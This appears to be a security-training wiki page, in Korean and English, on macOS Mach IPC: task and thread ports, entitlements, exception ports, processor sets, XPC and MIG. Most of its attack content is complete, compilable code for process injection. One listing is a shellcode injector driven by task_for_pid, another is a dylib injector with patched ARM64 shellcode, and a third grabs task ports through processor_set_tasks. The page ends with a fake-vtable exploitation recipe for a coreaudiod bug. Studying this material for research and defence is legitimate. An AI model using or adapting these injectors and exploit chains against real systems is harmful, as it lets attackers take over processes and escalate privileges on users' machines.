원래 Mach에는 "processes"가 없었고 "tasks"가 있었으며, 이는 스레드의 컨테이너에 더 가깝다고 여겨졌습니다. Mach가 BSD와 병합되면서 **각 task는 BSD 프로세스와 연관되었습니다**. 따라서 모든 BSD 프로세스는 프로세스가 되기 위한 필요한 세부 정보를 가지고 있고 모든 Mach task도 내부 동작을 가지고 있습니다(존재하지 않는 pid 0인 `kernel_task`는 제외).

이와 관련된 매우 흥미로운 함수 두 가지가 있습니다:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 지정된 `pid`와 관련된 task의 task port에 대한 SEND 권한을 얻어 이를 지정된 `target_task_port`에 부여합니다(보통 `mach_task_self()`를 사용한 호출자 task이지만, 다른 task에 대한 SEND 포트일 수도 있습니다).
- `pid_for_task(task, &pid)`: task에 대한 SEND 권한이 주어졌을 때, 이 task가 어떤 PID와 연관되어 있는지 찾습니다.

task 내부에서 동작을 수행하려면, task는 `mach_task_self()`를 호출하여 자기 자신에 대한 `SEND` 권한을 가져야 했습니다(`task_self_trap` (28)을 사용). 이 권한으로 task는 다음과 같은 여러 동작을 수행할 수 있습니다:

- `task_threads`: Get SEND right over all task ports of the threads of the task
- `task_info`: Get info about a task
- `task_suspend/resume`: Suspend or resume a task
- `task_[get/set]_special_port`
- `thread_create`: Create a thread
- `task_[get/set]_state`: Control task state
- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> 다른 **task**의 task port에 대한 SEND 권한을 가지면, 해당 다른 task에 대해 이러한 동작들을 수행할 수 있다는 점에 주의하세요.

또한, task_port는 **`vm_map`** 포트이기도 하여 `vm_read()`와 `vm_write()` 같은 함수를 통해 태스크 내부의 메모리를 **읽고 조작할 수 있게 합니다**. 이는 본질적으로 다른 task의 task_port에 대한 SEND 권한을 가진 task가 해당 task에 **코드를 주입할 수 있다**는 것을 의미합니다.

커널도 하나의 **task**이므로, 누군가 **`kernel_task`**에 대한 **SEND 권한**을 얻으면 커널이 임의의 코드를 실행하도록 만들 수 있다는 점을 기억하세요(탈옥).

- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
- These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
- If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
- Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
- **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

**The task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.

### Thread Ports

스레드도 관련 포트를 가지며, 이는 **`task_threads`**를 호출하는 task와 `processor_set_threads`를 사용하는 프로세서에서 볼 수 있습니다. thread port에 대한 SEND 권한은 `thread_act` 서브시스템의 함수들을 사용하게 해주며, 예를 들면:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

어떤 스레드든 **`mach_thread_sef`**를 호출하여 이 포트를 얻을 수 있습니다.

### Shellcode Injection in thread via Task port

You can grab a shellcode from:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

이전 프로그램을 **컴파일**하고 동일한 사용자로 코드 주입이 가능하도록 **entitlements**를 추가하세요(그렇지 않으면 **sudo**를 사용해야 합니다).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> iOS에서 이 방법을 작동시키려면 쓰기 가능한 메모리를 실행 가능하게 만들 수 있도록 `dynamic-codesigning` 권한(entitlement)이 필요합니다.

### Task port를 통한 스레드 내 Dylib Injection

macOS에서는 **스레드**가 **Mach**를 통해 또는 **posix `pthread` api**를 사용하여 조작될 수 있습니다. 이전 인젝션에서 생성한 스레드는 Mach api를 사용해 생성되었으므로 **posix 호환이 아닙니다**.

명령을 실행하기 위해 간단한 shellcode를 주입할 수 있었던 이유는 posix 호환 API와 작업할 필요가 없고 Mach만 사용했기 때문입니다. **더 복잡한 인젝션**은 **스레드**가 또한 **posix 호환**이어야 합니다.

따라서 **스레드를 개선하기 위해** `pthread_create_from_mach_thread`를 호출하여 **유효한 pthread를 생성**해야 합니다. 그런 다음, 이 새 pthread는 dlopen을 호출하여 시스템에서 dylib를 로드할 수 있으므로 새로운 shellcode를 작성해 다양한 동작을 수행하는 대신 커스텀 라이브러리를 로드할 수 있습니다.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

When calling `task_for_pid` or `thread_create_*` increments a counter in the struct task from the kernel which can by accessed from user mode calling task_info(task, TASK_EXTMOD_INFO, ...)

## 예외 포트

스레드에서 예외가 발생하면, 이 예외는 해당 스레드의 지정된 exception port로 전송된다. 스레드가 이를 처리하지 않으면 task exception ports로 전송된다. 태스크가 처리하지 않으면 launchd가 관리하는 host port로 전송되어(거기서 인정된다). 이를 exception triage라고 한다.

주의할 점은, 보통 적절히 처리되지 않으면 보고서는 결국 ReportCrash 데몬에 의해 처리된다는 것이다. 그러나 동일한 태스크 내의 다른 스레드가 예외를 처리할 수도 있으며, 이것이 `PLCreashReporter`와 같은 crash reporting 도구가 하는 일이다.

## 기타 오브젝트

### Clock

모든 사용자는 시계 정보에 접근할 수 있지만, 시간을 설정하거나 다른 설정을 수정하려면 root 권한이 필요하다.

정보를 얻기 위해서는 `clock` 서브시스템의 함수들(`clock_get_time`, `clock_get_attributtes` 또는 `clock_alarm` 등)을 호출할 수 있다.\
값을 수정하려면 `clock_priv` 서브시스템의 함수들(`clock_set_time`, `clock_set_attributes` 등)을 사용할 수 있다.

### Processors and Processor Set

processor API는 `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment` 같은 함수들을 호출하여 단일 논리 프로세서를 제어할 수 있게 해준다...

또한, **processor set** API는 여러 프로세서를 그룹화하는 방법을 제공한다. **`processor_set_default`**를 호출하면 기본 processor set을 가져올 수 있다.\
processor set과 상호작용하기 위한 흥미로운 API들은 다음과 같다:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), 과거에는 이것을 통해 앞서 언급한 보호를 우회하여 다른 프로세스의 task ports를 얻어 제어할 수 있었고, **`processor_set_tasks`**를 호출하여 모든 프로세스에서 host port를 얻을 수 있었다.\
오늘날에는 해당 함수를 사용하려면 root가 필요하며 이 기능은 보호되어 있어, 보호되지 않은 프로세스에서만 이러한 포트를 얻을 수 있다.

다음으로 시도해볼 수 있다:

<details>

<summary><strong>processor_set_tasks 코드</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
